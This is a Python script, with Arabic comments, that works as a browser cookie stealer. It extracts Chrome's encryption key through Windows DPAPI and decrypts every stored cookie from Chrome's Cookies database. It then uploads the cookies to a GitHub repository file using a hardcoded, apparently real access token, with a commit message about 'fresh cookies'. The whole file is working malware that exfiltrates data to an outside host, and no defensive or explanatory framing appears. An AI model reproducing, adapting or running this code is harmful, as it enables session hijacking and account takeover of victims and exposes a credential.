import os, json, base64, sqlite3, shutil, requests
from Crypto.Cipher import AES
import win32crypt

# بيانات مستودعك الحالية
TOKEN = "Ghp_o6rg9zoZDl2e0jWZhVVPeoBwep4o8413HOHC"
REPO = "Noor092324/Noor-config"
FILENAME = "Noor.json" # اسم الملف الموجود عندك في المستودع

def get_key():
    try:
        path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(path, "r", encoding="utf-8") as f:
            key = json.loads(f.read())["os_crypt"]["encrypted_key"]
        return win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
    except: return None

def harvest():
    key = get_key()
    if not key: return []
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    if not os.path.exists(db_path): return []
    
    shutil.copyfile(db_path, "temp.db")
    conn = sqlite3.connect("temp.db")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    
    cookies_data = []
    for host, name, enc_val in cursor.fetchall():
        try:
            iv, payload = enc_val[3:15], enc_val[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            val = cipher.decrypt(payload)[:-16].decode()
            cookies_data.append({"domain": host, "name": name, "value": val})
        except: continue
    conn.close()
    os.remove("temp.db")
    return cookies_data

def update_existing_file(new_cookies):
    url = f"https://api.github.com/repos/{REPO}/contents/{FILENAME}"
    headers = {"Authorization": f"token {TOKEN}"}
    
    # 1. جلب محتوى الملف الحالي (Noor.json)
    res = requests.get(url, headers=headers)
    if res.status_code == 200:
        file_data = res.json()
        current_content = json.loads(base64.b64decode(file_data['content']).decode('utf-8'))
        sha = file_data['sha']
        
        # 2. دمج الكوكيز الجديدة داخل هيكل ملفك الحالي
        current_content["extracted_data"] = new_cookies
        current_content["status"] = "updated_with_hits"
        
        # 3. رفع التحديث للملف نفسه
        updated_json = json.dumps(current_content, indent=4)
        encoded_content = base64.b64encode(updated_json.encode()).decode()
        
        payload = {
            "message": "Update Noor.json with fresh cookies",
            "content": encoded_content,
            "sha": sha
        }
        requests.put(url, json=payload, headers=headers)
        print("[V] تم تحديث الملف بنجاح.")

if __name__ == "__main__":
    new_hits = harvest()
    if new_hits:
        update_existing_file(new_hits)
